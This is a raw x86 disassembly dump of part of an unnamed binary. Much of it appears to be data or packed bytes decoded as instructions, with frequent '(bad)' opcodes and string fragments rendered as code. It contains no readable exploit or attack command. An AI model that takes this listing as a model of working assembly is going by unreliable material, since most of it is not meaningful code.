  422669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42266a:	mov    DWORD PTR [ebp-0x5a725a65],esp
  422670:	rol    DWORD PTR [ebx-0x2f],cl
  422673:	dec    ebp
  422674:	lock lods eax,DWORD PTR ds:[esi]
  422676:	imul   BYTE PTR [edi-0x76eb70ea]
  42267c:	xchg   ecx,eax
  42267d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42267e:	aaa    
  42267f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422680:	fwait
  422681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422682:	jae    0x422629
  422684:	popf   
  422685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422686:	cmp    esp,DWORD PTR [ebp-0x5a8c5a6b]
  42268c:	(bad)  
  42268d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42268e:	fwait
  42268f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422690:	xchg   DWORD PTR [ebp-0x522f5c2e],esp
  422696:	lock (bad) 
  422698:	test   BYTE PTR [edi-0x16eb10ea],0x91
  42269f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a0:	aaa    
  4226a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a2:	fwait
  4226a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a4:	jae    0x42264b
  4226a6:	popf   
  4226a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a8:	cmp    DWORD PTR [ebp-0x5a805a6b],esp
  4226ae:	(bad)  
  4226af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b0:	fwait
  4226b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b2:	and    DWORD PTR [ebp-0x722f7c2e],0xfffffff0
  4226b9:	in     eax,dx
  4226ba:	imul   bh
  4226bc:	push   ss
  4226bd:	iret   
  4226be:	adc    al,0xc9
  4226c0:	xchg   ecx,eax
  4226c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c2:	cmp    eax,0x51a59ba5
  4226c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c8:	popf   
  4226c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ca:	jnp    0x422671
  4226cc:	xchg   ebx,eax
  4226cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ce:	fwait
  4226cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d0:	xchg   ecx,eax
  4226d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d2:	shl    bl,cl
  4226d4:	shr    ch,1
  4226d6:	lock int 0xf6
  4226d9:	iret   
  4226da:	push   ss
  4226db:	das    
  4226dc:	adc    al,0x29
  4226de:	push   ss
  4226df:	unpcklps xmm1,XMMWORD PTR [ecx]
  4226e2:	xchg   ebx,eax
  4226e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226e4:	adc    DWORD PTR [ebp-0x5ab65a65],esp
  4226ea:	lahf   
  4226eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ec:	cmp    esp,DWORD PTR [ebp-0x5a825a6d]
  4226f2:	mov    DWORD PTR [ebp-0x5a725a65],esp
  4226f8:	shl    BYTE PTR [ebx],cl
  4226fa:	shr    BYTE PTR ds:0xff60df0,1
  422700:	push   ss
  422701:	outs   dx,DWORD PTR ds:[esi]
  422702:	adc    al,0x69
  422704:	xchg   ecx,eax
  422705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422706:	add    BYTE PTR [eax],al
  422708:	nop
  422709:	and    eax,0x279c0042
  42270e:	inc    edx
  42270f:	add    BYTE PTR [edi+eiz*1+0x292c0042],ah
  422716:	inc    edx
  422717:	add    BYTE PTR [eax-0x57ffbddb],cl
  42271d:	daa    
  42271e:	inc    edx
  42271f:	add    dh,cl
  422721:	jle    0x422765
  422723:	add    BYTE PTR [esi-0x7f],al
  422726:	inc    edx
  422727:	add    BYTE PTR [eax+0x1c004228],bl
  42272d:	sub    DWORD PTR [edx+0x0],eax
  422730:	test   BYTE PTR [edi],ah
  422732:	inc    edx
  422733:	add    BYTE PTR [eax+0x18004227],cl
  422739:	sub    DWORD PTR [edx+0x0],eax
  42273c:	in     al,dx
  42273d:	daa    
  42273e:	inc    edx
  42273f:	add    BYTE PTR [edx-0x36],cl
  422742:	push   es
  422743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422744:	scas   al,BYTE PTR es:[edi]
  422745:	or     eax,0x27a0a506
  42274a:	inc    edx
  42274b:	add    BYTE PTR [eax+0x28],dl
  42274e:	inc    edx
  42274f:	add    BYTE PTR [eax+ebp*1+0x42],ah
  422753:	add    BYTE PTR [eax+0x28],dh
  422756:	inc    edx
  422757:	add    BYTE PTR [eax-0x27ffbdd8],al
  42275d:	daa    
  42275e:	inc    edx
  42275f:	add    BYTE PTR [ebp+eiz*1+0x27f80042],cl
  422766:	inc    edx
  422767:	add    al,ch
  422769:	daa    
  42276a:	inc    edx
  42276b:	add    BYTE PTR [eax],dh
  42276d:	sub    DWORD PTR [edx+0x0],eax
  422770:	scas   al,BYTE PTR es:[edi]
  422771:	fwait
  422772:	push   es
  422773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422774:	cmp    BYTE PTR [edx-0x19],al
  422777:	mov    esp,0x422808
  42277c:	adc    BYTE PTR [eax],ch
  42277e:	inc    edx
  42277f:	add    BYTE PTR [edi+eiz*1-0x79dbffbe],ch
  422786:	loopne 0x422744
  422788:	jbe    0x422804
  42278a:	pop    ds
  42278b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42278c:	add    BYTE PTR [eax],al
  42278e:	inc    eax
  42278f:	add    cl,dh
  422791:	retf   
  422792:	arpl   WORD PTR [eax+0x43],bx
  422795:	add    DWORD PTR [edx+0x0],0x6ae878a8
  42279c:	ja     0x4227ac
  42279e:	pop    ebx
  42279f:	xor    BYTE PTR [esi-0x6],dh
  4227a2:	(bad)  
  4227a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227a4:	mov    dl,0xd
  4227a6:	xchg   ebx,eax
  4227a7:	test   eax,0x422794
  4227ac:	stos   BYTE PTR es:[edi],al
  4227ad:	fild   DWORD PTR [esi]
  4227af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b0:	stos   BYTE PTR es:[edi],al
  4227b1:	fild   WORD PTR [esi]
  4227b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227b5:	fild   DWORD PTR [esi]
  4227b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b8:	mov    ds:0xbea506db,al
  4227bd:	fild   DWORD PTR [esi]
  4227bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c0:	mov    edx,0xb6a506db
  4227c5:	fild   DWORD PTR [esi]
  4227c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c8:	mov    dl,0xdb
  4227ca:	push   es
  4227cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227cc:	mov    ds,ebx
  4227ce:	push   es
  4227cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d0:	mov    bl,bl
  4227d2:	push   es
  4227d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d4:	out    dx,al
  4227d5:	fild   DWORD PTR [esi]
  4227d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d8:	dec    DWORD PTR [edx]
  4227da:	adc    edi,DWORD PTR [ebx]
  4227dc:	test   BYTE PTR ds:0x2a750042,ah
  4227e2:	inc    edx
  4227e3:	add    BYTE PTR [ecx+0x73],ah
  4227e6:	push   0x69bae79
  4227eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227ec:	cmp    cl,dl
  4227ee:	xlat   BYTE PTR ds:[ebx]
  4227ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f0:	dec    sp
  4227f2:	add    BYTE PTR [eax],al
  4227f4:	and    BYTE PTR ds:0x42220042,0x1b
  4227fb:	add    DWORD PTR [eax],0x0
	...
  422806:	add    BYTE PTR [eax],al
  422808:	hlt    
  422809:	stc    
  42280a:	sar    BYTE PTR [edi+edi*4+0x2b309341],cl
  422811:	inc    esi
  422812:	pop    ds
  422813:	jg     0x422815
	...
  422839:	add    BYTE PTR [eax],al
  42283b:	add    dh,cl
  42283d:	jle    0x422881
	...
  42284b:	add    BYTE PTR [edi-0x4c],al
  42284e:	inc    ecx
  42284f:	add    BYTE PTR [ebp-0x5b],cl
  422852:	push   ecx
  422853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422854:	jg     0x4227fb
  422856:	inc    edi
  422857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422858:	push   ecx
  422859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285a:	inc    ebx
  42285b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285c:	std    
  42285d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285e:	jmp    DWORD PTR [ebp+0xa59b]
  422864:	push   ebp
  422865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422866:	push   ebx
  422867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422868:	dec    ecx
  422869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42286a:	std    
  42286b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42286c:	jmp    DWORD PTR [ebp-0x5a8e5a65]
  422872:	jge    0x422819
  422874:	push   ecx
  422875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422876:	jg     0x42281d
  422878:	std    
  422879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42287a:	jmp    DWORD PTR [ebp+0xa59b]
  422880:	jge    0x422827
  422882:	dec    ebx
  422883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422884:	inc    ebx
  422885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422886:	jne    0x42282d
  422888:	pop    ecx
  422889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42288a:	jnp    0x422831
  42288c:	dec    ecx
  42288d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42288e:	fwait
  42288f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  422898:	xor    eax,ecx
  42289a:	xor    esp,DWORD PTR [ecx]
  42289c:	xor    eax,DWORD PTR [ecx]
  42289e:	xor    esp,DWORD PTR [ecx+0x33]
  4228a1:	inc    ecx
  4228a2:	xor    ah,BYTE PTR [ecx-0x1ecd7ece]
  4228a8:	xor    al,cl
  4228aa:	xor    ah,BYTE PTR [ecx]
  4228ac:	xor    al,BYTE PTR [ecx]
  4228ae:	xor    ah,BYTE PTR [ecx+0x32]
  4228b1:	inc    ecx
  4228b2:	xor    eax,DWORD PTR [ecx-0x3ccc1ecd]
  4228b8:	xor    ecx,ebp
  4228ba:	xor    ecx,edi
  4228bc:	xor    ecx,ecx
  4228be:	xor    ecx,ebx
  4228c0:	xor    edx,ebp
  4228c2:	xor    edx,edi
  4228c4:	xor    edx,ecx
  4228c6:	xor    edx,ebx
  4228c8:	xor    ebx,ebp
  4228ca:	xor    ebx,edi
  4228cc:	xor    ebx,ecx
  4228ce:	xor    ebx,ebx
  4228d0:	xor    eax,edi
  4228d2:	push   ebx
  4228d3:	shl    DWORD PTR [ebx-0x3f],0x93
  4228d7:	rcl    BYTE PTR [esi-0x55],0x15
  4228db:	iret   
  4228dc:	xchg   ebp,eax
  4228dd:	dec    eax
  4228de:	xor    ecx,ebp
  4228e0:	sbb    eax,0x50aaaae3
  4228e5:	imul   ebx,DWORD PTR [esi],0x2f
  4228e8:	je     0x4228ff
  4228ea:	mov    DWORD PTR [edx+0x556ad694],ecx
  4228f0:	imul   edi,ebx,0xffffffd5
  4228f3:	enter  0x4927,0xef
  4228f7:	popf   
  4228f8:	mov    dh,0xde
  4228fa:	dec    esi
  4228fb:	xchg   esp,eax
  4228fc:	lock xor BYTE PTR [esi-0x6b],ch
  422900:	inc    ebp
  422901:	or     al,0x76
  422903:	or     DWORD PTR [edi-0x40],eax
  422906:	js     0x4228c2
  422908:	popa   
  422909:	pop    eax
  42290a:	jecxz  0x422976
  42290c:	mov    BYTE PTR [ebx-0x56],0x4
  422910:	cs leave 
  422912:	inc    esi
  422913:	stos   DWORD PTR es:[edi],eax
  422914:	inc    esp
  422915:	ds inc ebp
  422917:	enter  0x82f6,0x93
  42291b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42291c:	sbb    DWORD PTR [eax],ecx
  42291e:	fdivr  DWORD PTR [esp+ebp*1-0x1e]
  422922:	inc    edx
  422923:	add    cl,dl
  422925:	ja     0x422996
  422927:	mov    WORD PTR gs:[edi],fs
  42292a:	inc    edx
  42292b:	add    al,dh
  42292d:	daa    
  42292e:	inc    edx
  42292f:	add    BYTE PTR [esi-0x6],dh
  422932:	fbld   TBYTE PTR [eax+eax*1+0x0]
  422939:	add    BYTE PTR [eax],al
  42293b:	add    BYTE PTR [eax],al
  42293d:	add    BYTE PTR [eax],al
  42293f:	add    BYTE PTR [eax-0x15],bl
  422942:	push   ss
  422943:	cmp    eax,0x65646543
  422948:	push   esi
  422949:	imul   ebp,DWORD PTR gs:[esi+0x6f],0x616f7377
  422951:	jb     0x4229c7
  422953:	gs bound esp,QWORD PTR gs:[ecx+0x6c]
  422958:	jecxz  0x422921
  42295a:	shr    DWORD PTR [ebx+edx*8-0x3f],0xa3
  42295f:	cmp    al,BYTE PTR [esi-0x2d]
  422962:	jno    0x4229de
  422964:	outs   dx,DWORD PTR ds:[esi]
  422965:	jae    0x4229d7
  422967:	popa   
  422968:	je     0x4229d2
  42296a:	bound  esp,QWORD PTR [ecx+0x73]
  42296d:	je     0x4229de
  42296f:	outs   dx,DWORD PTR ds:[esi]
  422970:	test   eax,0xde3655f5
  422975:	in     al,0x6c
  422977:	jne    0x4229e1
  422979:	bound  esp,QWORD PTR [ebp+0x4b]
  42297c:	popa   
  42297d:	jbe    0x4229e0
  42297f:	outs   dx,WORD PTR ds:[esi]
  422981:	jns    0x4229f2
  422983:	imul   edi,DWORD PTR [eax],0x2c054cf4
  422989:	pusha  
  42298a:	and    BYTE PTR [edi+0x79],dh
  42298d:	gs jo  0x4229ff
  422990:	ins    DWORD PTR es:[edi],dx
  422991:	ja     0x422a0c
  422993:	gs inc ebp
  422995:	jns    0x4229fc
  422997:	jb     0x422999
	...
  4229a9:	add    BYTE PTR [eax],al
  4229ab:	add    BYTE PTR [esi-0x4e],dl
  4229ae:	and    dl,BYTE PTR [ecx]
  4229b0:	imul   esp,DWORD PTR [ebx+0x75],0x74
  4229b4:	imul   ebp,DWORD PTR [di+0x70],0xd71e3755
  4229bc:	fldcw  WORD PTR [eax+edx*2]
  4229bf:	fimul  WORD PTR [ebx]
  4229c1:	cmp    esi,DWORD PTR [esp+eax*4-0x66]
  4229c5:	fldcw  WORD PTR [eax+0x69]
  4229c8:	lods   al,BYTE PTR ds:[esi]
  4229c9:	repnz retf 0xe41c
  4229cd:	inc    ebx
  4229ce:	outs   dx,DWORD PTR ds:[esi]
  4229cf:	je     0x422a44
  4229d1:	dec    esp
  4229d2:	popa   
  4229d3:	jp     0x422a4e
  4229d5:	push   ebx
  4229d6:	imul   esp,DWORD PTR [ecx+0x73],0x73
  4229da:	push   0xc3066a00
  4229df:	lds    eax,FWORD PTR [eax+0x6569646f]
  4229e5:	add    al,bl
  4229e7:	mov    ebp,0x2ee9d1e4
  4229ec:	jle    0x4229a0
  4229ee:	data16 gs ja 0x422a65
  4229f2:	jne    0x422a56
  4229f4:	add    BYTE PTR [eax],al
  4229f6:	add    DWORD PTR [edx+0x51cf72f8],edi
  4229fc:	fstp   DWORD PTR [eax+0x74]
  4229ff:	popa   
  422a00:	jae    0x422a74
  422a02:	popa   
  422a03:	js     0x422a6d
  422a05:	outs   dx,DWORD PTR ds:[esi]
  422a06:	add    BYTE PTR [eax],al
  422a08:	mov    esi,0x4d270df8
  422a0d:	popa   
  422a0e:	ins    BYTE PTR es:[edi],dx
  422a0f:	je     0x422a5d
  422a11:	jne    0x422a85
  422a13:	imul   eax,DWORD PTR [eax],0x0
  422a16:	dec    edx
  422a17:	loope  0x422a27
  422a19:	out    0xd3,al
  422a1b:	test   al,0x57
  422a1d:	popa   
  422a1e:	jb     0x422a8b
  422a20:	jne    0x422a96
  422a22:	outs   dx,DWORD PTR fs:[esi]
  422a24:	bound  ebp,QWORD PTR [edi+0x0]
  422a27:	add    BYTE PTR [ebp+eax*1+0x62cfc27],dl
  422a2e:	jne    0x422a9d
  422a30:	outs   dx,DWORD PTR ds:[esi]
  422a31:	js     0x422a33
  422a33:	add    BYTE PTR [ecx+edx*8+0x58],ch
  422a37:	or     bh,BYTE PTR [ecx+ebx*2]
  422a3a:	add    al,0xd6
  422a3c:	gs ins DWORD PTR es:[edi],dx
  422a3e:	jns    0x422aaf
  422a40:	jo     0x422ab7
  422a42:	je     0x422a97
  422a44:	push   0x6170676f
  422a49:	jns    0x422ab5
  422a4b:	outs   dx,DWORD PTR ds:[esi]
  422a4c:	popa   
  422a4d:	jns    0x422a09
  422a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a50:	scas   al,BYTE PTR es:[edi]
  422a51:	or     al,0xaf
  422a53:	adc    al,0x63
  422a55:	popa   
  422a56:	jns    0x422a9f
  422a58:	jne    0x422ad0
  422a5a:	jae    0x422ad0
  422a5c:	imul   esp,DWORD PTR [ebx+0x73],0x61636f6e
  422a63:	jb     0x422aca
  422a65:	imul   ebp,DWORD PTR [ecx+0x25],0xffffffda
  422a69:	(bad)  
  422a6a:	out    dx,al
  422a6b:	push   ebx
  422a6c:	popa   
  422a6d:	arpl   WORD PTR [ebx+0x66],si
  422a70:	imul   esp,DWORD PTR [edx+0x64],0x9780006f
  422a77:	xchg   DWORD PTR [esi-0x7488fe6a],edx
  422a7d:	push   eax
  422a7e:	ja     0x422a0a
  422a80:	cdq    
  422a81:	adc    bh,0x8a
  422a84:	pop    esi
  422a85:	fldenv [ecx+0x6f5038a6]
  422a8b:	adc    bh,0x8b
  422a8e:	arpl   WORD PTR [edx],si
  422a90:	test   eax,0x92fcefd7
  422a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a96:	xchg   ah,bh
  422a98:	fsubr  st,st(7)
  422a9a:	arpl   sp,di
  422a9c:	fsub   DWORD PTR [esi+0xc92fc86]
  422aa2:	cdq    
  422aa3:	jo     0x422b19
  422aa5:	xchg   edi,eax
  422aa6:	add    BYTE PTR [edi+0x77019696],0x8b
  422aad:	push   eax
  422aae:	ja     0x422a3a
  422ab0:	adc    BYTE PTR [edi-0x2703a176],0x5b
  422ab7:	cmp    BYTE PTR [eax+0xc],dl
  422aba:	adc    BYTE PTR [edi-0x28089c75],0x9
  422ac1:	xor    BYTE PTR [edi-0x11],0xfc
  422ac5:	xchg   edx,eax
  422ac6:	xor    BYTE PTR [ebp+0x138c6dfc],ah
  422acc:	cld    
  422acd:	xchg   edx,eax
  422ace:	outs   dx,DWORD PTR ds:[esi]
  422acf:	mov    ds:0x31ec92fc,eax
  422ad4:	jo     0x422ad1
  422ad6:	out    dx,al
  422ad7:	lea    edx,[edi-0x69697880]
  422add:	add    DWORD PTR [edi-0x75],esi
  422ae0:	push   eax
  422ae1:	ja     0x422a6d
  422ae3:	adc    BYTE PTR [edi-0x2326a176],0x1c
  422aea:	hlt    
  422aeb:	push   eax
  422aec:	or     al,0x80
  422aee:	xchg   edi,eax
  422aef:	mov    esp,DWORD PTR [ebx-0x9]
  422af2:	xlat   BYTE PTR ds:[ebx]
  422af3:	out    dx,al
  422af4:	cld    
  422af5:	xchg   edx,eax
  422af6:	mov    WORD PTR [ebx],ss
  422af8:	xor    BYTE PTR [edi-0x11],0xfc
  422afc:	xchg   edx,eax
  422afd:	cmp    dl,BYTE PTR [esi+0x65306dfc]
  422b03:	jo     0x422b00
  422b05:	out    dx,al
  422b06:	lea    edx,[edi-0x69697880]
  422b0c:	add    DWORD PTR [edi-0x75],esi
  422b0f:	push   eax
  422b10:	ja     0x422a9c
  422b12:	cdq    
  422b13:	adc    bh,0x8a
  422b16:	pop    esi
  422b17:	fsubrp st(7),st
  422b19:	xor    edi,DWORD PTR [eax+edx*2]
  422b1c:	outs   dx,DWORD PTR ds:[esi]
  422b1d:	adc    bh,0x8b
  422b20:	arpl   WORD PTR [edx],si
  422b22:	test   eax,0xd8fca6d7
  422b27:	out    dx,al
  422b28:	fwait
  422b29:	mov    ecx,0x31ec927c
  422b2e:	fwait
  422b2f:	cld    
  422b30:	or     al,0x43
  422b32:	jo     0x422ba8
  422b34:	xchg   edi,eax
  422b35:	add    BYTE PTR [edi+0x77019696],0x8b
  422b3c:	push   eax
  422b3d:	ja     0x422ac9
  422b3f:	adc    BYTE PTR [edi-0x6d1fa176],0x3b
  422b46:	cmp    BYTE PTR [eax+0xc],dl
  422b49:	adc    BYTE PTR [edi-0x28089c75],0xff
  422b50:	xor    BYTE PTR [edi-0x11],0xfc
  422b54:	xchg   edx,eax
  422b55:	out    dx,eax
  422b56:	mov    ds:0x963a6dfc,eax
  422b5b:	cld    
  422b5c:	xchg   edx,eax
  422b5d:	das    
  422b5e:	stos   DWORD PTR es:[edi],eax
  422b5f:	jo     0x422b5c
  422b61:	out    dx,al
  422b62:	lea    ebx,[ebx-0x7f686c67]
  422b68:	xchg   DWORD PTR [eax+0x773a3577],eax
  422b6e:	cmp    eax,0xd7808a0a
  422b73:	sbb    eax,0x9925d73a
  422b78:	adc    bh,0x15
  422b7b:	dec    eax
  422b7c:	shr    DWORD PTR [edx-0x12f24e71],1
  422b82:	std    
  422b83:	dec    ebp
  422b84:	xchg   esp,eax
  422b85:	test   BYTE PTR [ebx-0x9],cl
  422b88:	or     cl,BYTE PTR [edi+0x4dfded51]
  422b8e:	xchg   esp,eax
  422b8f:	test   BYTE PTR [ebx-0x9],cl
  422b92:	or     cl,BYTE PTR [esi+edi*8]
  422b95:	or     BYTE PTR ds:0x432187ed,0x6a
  422b9c:	ins    DWORD PTR es:[edi],dx
  422b9d:	or     cl,BYTE PTR [edx]
  422b9f:	or     cl,BYTE PTR [edx]
  422ba1:	or     bl,BYTE PTR [ebx-0x1266f4bd]
  422ba7:	adc    DWORD PTR [ebp+0x5e],ecx
  422baa:	(bad)  
  422bab:	in     al,dx
  422bac:	lea    ecx,[ebp+0x10018494]
  422bb2:	pop    ecx
  422bb3:	mov    WORD PTR [ebp-0x1172a173],cs
  422bb9:	(bad)  
  422bba:	out    dx,al
  422bbb:	mov    dh,0xbe
  422bbd:	mov    BYTE PTR [edx+eiz*8+0x2f],0x9f
  422bc2:	xchg   BYTE PTR [ecx+0xc],ah
  422bc5:	lea    ecx,[ebp+0x5901cbf8]
  422bcb:	add    DWORD PTR [ebx-0x80],ebp
  422bce:	out    0x8a,eax
  422bd0:	xor    BYTE PTR [edi+0x32],0x43
  422bd4:	out    0x35,eax
  422bd6:	xor    edi,DWORD PTR [eax+edx*2+0x77]
  422bda:	xchg   BYTE PTR [edx-0x73],ah
  422bdd:	xchg   BYTE PTR [edi+0x98d8d0c],al
  422be3:	dec    edi
  422be4:	repnz lea ecx,[ebp-0x370f7073]
  422beb:	xor    esp,edi
  422bed:	xchg   DWORD PTR [esp+edi*4+0xbefbecd],edx
  422bf4:	mov    al,ds:0xec9d8894
  422bf9:	or     eax,0xeb6501a9
  422bfe:	mov    dl,0xbc
  422c00:	out    dx,eax
  422c01:	mov    WORD PTR gs:[esi-0x3a17beff],gs
  422c08:	mov    eax,ds:0x99968d8d
  422c0d:	cli    
  422c0e:	lea    edi,[edx]
  422c10:	lea    ecx,[ebp-0x1bc59df6]
  422c16:	push   ebp
  422c17:	and    bh,0x8a
  422c1a:	inc    ebx
  422c1b:	out    0x83,eax
  422c1d:	or     eax,esp
  422c1f:	imul   eax,DWORD PTR [eax-0x43495039],0xffffff80
  422c26:	push   ecx
  422c27:	xor    ecx,DWORD PTR [ebx-0x14]
  422c2a:	push   ecx
  422c2b:	add    ebp,eax
  422c2d:	lock lea eax,[esi-0x7272f3a0]
  422c34:	cmp    ch,0xb2
  422c37:	mov    bh,ch
  422c39:	in     eax,dx
  422c3a:	mov    edx,0xfa05633a
  422c3f:	lea    edi,[edx]
  422c41:	lea    ecx,[ebp-0x39c5e29]
  422c47:	in     al,0x9c
  422c49:	les    esp,FWORD PTR [edi]
  422c4b:	add    bh,0xaf
  422c4e:	xchg   cl,ch
  422c50:	or     al,0x8d
  422c52:	(bad)  
  422c53:	loop   0x422c8f
  422c55:	scas   al,BYTE PTR es:[edi]
  422c56:	in     al,dx
  422c57:	sti    
  422c58:	in     al,dx
  422c59:	ret    0x86ed
  422c5c:	cmp    ch,ch
  422c5e:	mov    BYTE PTR [edx],bh
  422c60:	sub    BYTE PTR [edx+0x63],0xfc
  422c64:	sub    BYTE PTR [edx-0x1c],0xb4
  422c68:	scas   al,BYTE PTR es:[edi]
  422c69:	fsubr  st,st(5)
  422c6b:	test   DWORD PTR [edi],ebp
  422c6d:	fiadd  DWORD PTR [eax-0x27f61b02]
  422c73:	in     eax,dx
  422c74:	test   edi,edi
  422c76:	fimul  DWORD PTR [esi-0x1b8ff212]
  422c7c:	out    dx,al
  422c7d:	mov    cs,WORD PTR [ebp+ecx*1-0x5549bc90]
  422c84:	(bad)  
  422c85:	leave  
  422c86:	bound  esi,QWORD PTR [edx-0x367902f3]
  422c8c:	or     al,0x8d
  422c8e:	(bad)  
  422c8f:	xlat   BYTE PTR ds:[ebx]
  422c90:	adc    eax,0x9faeab9d
  422c95:	scas   al,BYTE PTR es:[edi]
  422c96:	lahf   
  422c97:	dec    ebp
  422c98:	push   ebp
  422c99:	xor    eax,0xb5f1aa96
  422c9e:	outs   dx,DWORD PTR ds:[esi]
  422c9f:	lea    ecx,[ebp-0x2c3b7272]
  422ca5:	bound  edx,QWORD PTR [ecx-0x7e7902f3]
  422cab:	or     al,0x8d
  422cad:	(bad)  
  422cae:	xlat   BYTE PTR ds:[ebx]
  422caf:	dec    ecx
  422cb0:	bound  eax,QWORD PTR ds:0x1786fd0d
  422cb6:	or     al,0x8d
  422cb8:	(bad)  
  422cb9:	xlat   BYTE PTR ds:[ebx]
  422cba:	xchg   ebx,eax
  422cbb:	popf   
  422cbc:	mov    WORD PTR gs:[edx+0x30],fs
  422cc0:	in     al,0xc
  422cc2:	(bad)  
  422cc3:	dec    DWORD PTR [edx]
  422cc5:	adc    bh,0x8a
  422cc8:	inc    ebx
  422cc9:	xlat   BYTE PTR ds:[ebx]
  422cca:	and    DWORD PTR [ebx-0x29],0x35
  422cce:	or     edx,ebp
  422cd0:	mov    dh,0x3a
  422cd2:	lea    ecx,[ebp-0x75187fba]
  422cd8:	cmc    
  422cd9:	mov    esi,0x8d8d3adc
  422cde:	bound  eax,QWORD PTR [edx-0x72c5347a]
  422ce4:	lea    eax,[eax+0x23d582d7]
  422cea:	(bad)  
  422ceb:	stc    
  422cec:	xchg   BYTE PTR [eax],cl
  422cee:	cmp    cl,BYTE PTR [ebp+0x7ad7808d]
  422cf4:	aad    0x30
  422cf6:	adc    bh,0xf7
  422cf9:	xor    al,0x7a
  422cfc:	push   eax
  422cfd:	lock test DWORD PTR [eax-0xfaf7d10],0x83f0807a
  422d08:	push   eax
  422d09:	lock adc BYTE PTR [eax-0x29],0x83
  422d0e:	popf   
  422d0f:	stos   DWORD PTR es:[edi],eax
  422d10:	lahf   
  422d11:	icebp  
  422d12:	mov    ebp,0x8e8d8da6
  422d17:	out    dx,eax
  422d18:	in     al,dx
  422d19:	pushf  
  422d1a:	stos   BYTE PTR es:[edi],al
  422d1b:	fwait
  422d1c:	mov    WORD PTR gs:[edi-0x11f31b4e],cs
  422d23:	in     al,dx
  422d24:	or     al,BYTE PTR [eax-0x5795039]
  422d2a:	cmp    cl,BYTE PTR [ebp-0x7fea2873]
  422d30:	ja     0x422cb8
  422d32:	and    bh,0xaf
  422d35:	mov    dl,0x84
  422d37:	in     al,dx
  422d38:	inc    ebx
  422d39:	jo     0x422d1d
  422d3b:	out    dx,eax
  422d3c:	test   eax,0xee7be501
  422d41:	les    edx,FWORD PTR [edi-0x80]
  422d44:	(bad)  
  422d45:	scas   eax,DWORD PTR es:[edi]
  422d46:	in     eax,dx
  422d47:	js     0x422d55
  422d49:	xchg   BYTE PTR [eax],ch
  422d4b:	cmp    cl,BYTE PTR [ebp-0x7fe22873]
  422d51:	ja     0x422cd9
  422d53:	and    bh,0xaf
  422d56:	mov    dl,0x84
  422d58:	in     al,dx
  422d59:	loop   0x422d4a
  422d5b:	lahf   
  422d5c:	loop   0x422d4d
  422d5e:	test   eax,0xee7b6601
  422d63:	cmp    cl,BYTE PTR [ebp+0x6c71c48d]
  422d69:	out    dx,al
  422d6a:	or     al,0x8d
  422d6c:	(bad)  
  422d6d:	in     al,dx
  422d6e:	out    0xaf,eax
  422d70:	loop   0x422de3
  422d72:	lahf   
  422d73:	cli    
  422d74:	lea    edi,[edx]
  422d76:	lea    ecx,[ebp+0x43f9f050]
  422d7c:	push   0x6d
  422d7e:	and    BYTE PTR [ecx-0x7a],0xbd
